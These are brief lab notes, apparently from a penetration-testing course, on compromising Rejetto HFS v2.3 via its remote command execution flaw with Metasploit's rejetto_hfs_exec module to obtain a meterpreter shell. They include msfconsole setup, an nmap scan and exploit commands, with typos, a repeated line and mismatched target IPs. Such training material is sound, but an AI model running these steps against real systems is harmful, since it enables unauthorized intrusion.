### Exploiting A vulnerable HTTP file server
- An HTTP fle server(HFS) is a web server that is designed for file & document sharing.
- HTTP File Server typically run on TCP port 80 and utilize the HTTP protocol for underlyzing communication
- Rejetto HFS is a popular free and open source HTTP file server that can be setup on both windows and linux server.
- Rejetto HFS is popular free and open source HTTP file server that can be setup on both windows and linux.
- Rejetto HFS v2.3 is vulnerable to a remote command execution attack.
- MSF has an exploit module that can utilize to gain access to the target system hosting the HFS.

#### Lab
- service postgresql start
- msfconsole
- db_status
- workspace -a HFS
##### Exploit
- setg RHOSTS 10.10.10.12
- db_nmap -sS -sV -O 10.2.24.160
- search type:exploit name:rejetto
- use exploit/windows/http/rejetto_hfs_exec
- set requires variables
- run
- this will give us meterpreter sessions
